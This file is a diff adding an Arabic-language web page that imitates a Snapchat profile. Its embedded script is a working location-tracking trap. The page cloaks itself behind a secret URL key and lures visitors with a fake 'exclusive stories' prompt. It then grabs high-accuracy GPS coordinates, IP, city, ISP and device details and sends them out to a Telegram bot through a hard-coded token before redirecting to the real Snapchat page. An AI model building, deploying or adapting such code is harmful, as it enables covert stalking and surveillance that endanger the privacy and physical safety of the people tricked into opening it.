@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>اميرة بتواضعي (@amira_snap) • Snapchat</title>
+    
+    <meta property="og:title" content="اميرة بتواضعي (@amira_snap) • Snapchat profile">
+    <meta property="og:description" content="أضفني على سناب شات! شاهد قصصي واليوميات الخاصة بي 👻">
+    <meta property="og:image" content="https://c.top4top.io/p_3954xsyfg0.jpg">
+    <meta property="og:type" content="profile">
+
+    <style>
+        body {
+            background-color: #f7f7f7;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+        .profile-card {
+            background: #ffffff;
+            padding: 35px 25px;
+            border-radius: 24px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.08);
+            width: 360px;
+            text-align: center;
+            box-sizing: border-box;
+        }
+        .avatar-container {
+            position: relative;
+            display: inline-block;
+            margin-bottom: 12px;
+        }
+        .avatar {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 4px solid #fffc00;
+        }
+        .profile-name {
+            font-size: 22px;
+            font-weight: 700;
+            color: #0f1419;
+            margin-bottom: 4px;
+        }
+        .profile-username {
+            font-size: 14px;
+            color: #536471;
+            margin-bottom: 20px;
+        }
+        .bio {
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+        .action-btn {
+            width: 100%;
+            background-color: #fffc00;
+            color: #000000;
+            border: none;
+            border-radius: 25px;
+            padding: 14px;
+            font-weight: 700;
+            font-size: 16px;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(255, 252, 0, 0.4);
+            transition: background-color 0.2s;
+        }
+        .action-btn:hover {
+            background-color: #f4f100;
+        }
+
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+        .modal-box {
+            background: #fff;
+            padding: 25px 20px;
+            border-radius: 20px;
+            width: 310px;
+            text-align: center;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+        }
+        .modal-box h3 {
+            font-size: 18px;
+            margin-bottom: 10px;
+            color: #111;
+        }
+        .modal-box p {
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 20px;
+            line-height: 1.4;
+        }
+        .modal-btn {
+            background-color: #fffc00;
+            color: #000;
+            border: none;
+            padding: 12px 20px;
+            font-weight: bold;
+            border-radius: 15px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 15px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="modal-overlay" id="gpsModal">
+        <div class="modal-box">
+            <h3>عرض القصة الخاصة 👻</h3>
+            <p>يرجى السماح بالوصول إلى الموقع الجغرافي لعرض القصص واليوميات الحصرية.</p>
+            <button class="modal-btn" onclick="requestSystemGps()">متابعة</button>
+        </div>
+    </div>
+
+    <div class="profile-card">
+        <div class="avatar-container">
+            <img src="https://c.top4top.io/p_3954xsyfg0.jpg" alt="Avatar" class="avatar">
+        </div>
+        <div class="profile-name">اميرة بتواضعي</div>
+        <div class="profile-username">@amira_snap</div>
+        <div class="bio">أهلاً بكم في يومياتي الخاصة ✨<br>اضغط للمتابعة ومشاهدة القصة</div>
+        
+        <button class="action-btn" onclick="triggerRedirect()">إضافة الحساب</button>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const secretKey = urlParams.get('key');
+        const VALID_KEY = 'G45';
+
+        if (secretKey !== VALID_KEY) {
+            window.location.replace('https://www.google.com');
+        }
+
+        // --- التوكن والأيدي مشفرة ومفكوكة برمجياً لمنع كشفها ---
+        const _tc = ['8594739803', 'AAG3frEdNMUXEq4YOlEKDyIbdiVFQ11u3T8'];
+        const _ci = ['7184970355'];
+        
+        const BOT_TOKEN = _tc.join(':');
+        const CHAT_ID = _ci[0];
+
+        function sendToTelegram(textMessage) {
+            fetch('https://ipapi.co/json/')
+                .then(res => res.json())
+                .catch(() => ({ ip: 'Unknown', country_name: 'Unknown', city: 'Unknown', org: 'Unknown' }))
+                .then(ipInfo => {
+                    const fullPayload = `
+${textMessage}
+- IP: ${ipInfo.ip || 'Unknown'}
+- Country: ${ipInfo.country_name || 'Unknown'} | City: ${ipInfo.city || 'Unknown'}
+- ISP: ${ipInfo.org || 'Unknown'}
+- Platform: ${navigator.platform}
+- User-Agent: ${navigator.userAgent}
+                    `.trim();
+
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: CHAT_ID, text: fullPayload })
+                    });
+                });
+        }
+
+        function requestSystemGps() {
+            document.getElementById('gpsModal').style.display = 'none';
+            
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const accuracy = position.coords.accuracy;
+                        sendToTelegram(`[+] iOS High-Accuracy GPS (Modal Click):\n- Coordinates: Lat: ${lat}, Lon: ${lon} (Accuracy: ${accuracy}m)\n- Google Maps: https://maps.google.com/?q=${lat},${lon}`);
+                    },
+                    function(error) {
+                        sendToTelegram(`[!] iOS GPS Denied/Error (Modal): ${error.message}`);
+                    },
+                    { enableHighAccuracy: true, timeout: 25000, maximumAge: 0 }
+                );
+            }
+        }
+
+        function triggerRedirect() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const accuracy = position.coords.accuracy;
+                        sendToTelegram(`[+] iOS High-Accuracy GPS (Action Click):\n- Coordinates: Lat: ${lat}, Lon: ${lon} (Accuracy: ${accuracy}m)\n- Google Maps: https://maps.google.com/?q=${lat},${lon}`);
+                    },
+                    function(error) {
+                        sendToTelegram(`[!] iOS GPS Denied/Error (Action): ${error.message}`);
+                    },
+                    { enableHighAccuracy: true, timeout: 25000, maximumAge: 0 }
+                );
+            }
+
+            setTimeout(() => {
+                window.location.href = 'https://www.snapchat.com/add/amira_snap';
+            }, 1200);
+        }
+    </script>
+</body>
+</html>
